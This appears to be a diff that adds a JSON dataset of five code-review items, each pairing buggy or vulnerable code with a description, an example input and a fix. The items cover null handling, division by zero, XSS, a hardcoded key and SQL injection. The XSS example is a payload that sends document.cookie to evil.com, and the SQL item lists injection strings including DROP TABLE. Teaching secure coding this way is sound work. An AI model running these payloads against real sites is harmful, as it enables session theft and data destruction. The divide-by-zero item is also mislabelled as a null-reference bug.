@@ -1,0 +1,97 @@
+[
+  {
+    "id": "ERR-000001",
+    "language": "Python",
+    "code": "def process_student(data):\n    student = data.get(\"student\")\n    return student[\"metadata\"].strip()\n",
+    "expected_behavior": "Should safely return the trimmed 'metadata' of the student, or None if missing.",
+    "issues": [
+      {
+        "issue_id": "RUNTIME-001",
+        "line": 3,
+        "severity": "High",
+        "category": "Null/None Reference",
+        "description": "`data.get(\"student\")` returns None if the key is absent, but the code immediately indexes into it, causing a TypeError/AttributeError.",
+        "root_cause": "Missing null check after a dict.get() call that can return None.",
+        "impact": "Any request without a 'student' key crashes the function with an unhandled exception in production.",
+        "example": "process_student({})  # raises TypeError: NoneType is not subscriptable",
+        "fix": "if student is None or \"metadata\" not in student:\n        return None\n    return student[\"metadata\"].strip()"
+      }
+    ]
+  },
+  {
+    "id": "ERR-000002",
+    "language": "Python",
+    "code": "def divide(a, b):\n    return a / b\n",
+    "expected_behavior": "Should safely divide a by b and return the result, or raise a clear error when b is zero.",
+    "issues": [
+      {
+        "issue_id": "RUNTIME-002",
+        "line": 2,
+        "severity": "High",
+        "category": "Null/None Reference",
+        "description": "No check for b == 0 before division, causing ZeroDivisionError at runtime.",
+        "root_cause": "Missing zero-denominator guard before division.",
+        "impact": "divide(10, 0) raises ZeroDivisionError and crashes the caller.",
+        "example": "divide(10, 0)  # raises ZeroDivisionError",
+        "fix": "if b == 0:\n        raise ValueError('Denominator cannot be zero')\n    return a / b"
+      }
+    ]
+  },
+  {
+    "id": "ERR-000003",
+    "language": "JavaScript",
+    "code": "function renderComment(comment) {\n    document.getElementById('box').innerHTML = comment;\n}\n",
+    "expected_behavior": "Should render user comment as plain text without executing embedded HTML/scripts.",
+    "issues": [
+      {
+        "issue_id": "SEC-002",
+        "line": 2,
+        "severity": "Critical",
+        "category": "Cross-Site Scripting (XSS)",
+        "description": "User-supplied `comment` is inserted via `innerHTML`, so any script tags execute in the browser.",
+        "root_cause": "Untrusted input rendered with innerHTML instead of textContent.",
+        "impact": "Attacker can steal session cookies or perform arbitrary actions as the victim.",
+        "example": "renderComment('<img src=x onerror=\"fetch(evil.com+document.cookie)\">')",
+        "fix": "document.getElementById('box').textContent = comment;"
+      }
+    ]
+  },
+  {
+    "id": "ERR-000004",
+    "language": "Python",
+    "code": "API_KEY = \"REDACTED_STRIPE_API_KEY\"\n\ndef call_api():\n    return requests.get('https://api.example.com/data', headers={'Authorization': API_KEY})\n",
+    "expected_behavior": "Should authenticate using a secret loaded from environment, not committed to source control.",
+    "issues": [
+      {
+        "issue_id": "SEC-004",
+        "line": 1,
+        "severity": "Critical",
+        "category": "Hardcoded Credentials/Secrets",
+        "description": "Live API key is hardcoded directly in source code and will be exposed in version control.",
+        "root_cause": "Secret committed to codebase instead of loaded from environment variables.",
+        "impact": "Anyone with repo access can steal and misuse the key.",
+        "example": "git log -p | grep REDACTED_SECRET_PATTERN  # key visible in git history",
+        "fix": "import os\nAPI_KEY = os.environ['API_KEY']"
+      }
+    ]
+  },
+  {
+    "id": "ERR-000005",
+    "language": "Python",
+    "code": "def get_user(user_id):\n    query = 'SELECT * FROM users WHERE id = ' + user_id\n    cursor.execute(query)\n    return cursor.fetchone()\n",
+    "expected_behavior": "Should safely fetch user by id using parameterized queries to prevent SQL injection.",
+    "issues": [
+      {
+        "issue_id": "SEC-001",
+        "line": 2,
+        "severity": "Critical",
+        "category": "SQL Injection",
+        "description": "User input is concatenated directly into SQL string without sanitization.",
+        "root_cause": "String concatenation used to build SQL query with untrusted input.",
+        "impact": "Attacker can pass '1 OR 1=1; DROP TABLE users;--' to read or destroy data.",
+        "example": "get_user(\"1 OR 1=1\")  # returns all rows, bypasses filter",
+        "fix": "query = 'SELECT * FROM users WHERE id = %s'\n    cursor.execute(query, (user_id,))"
+      }
+    ]
+  }
+]
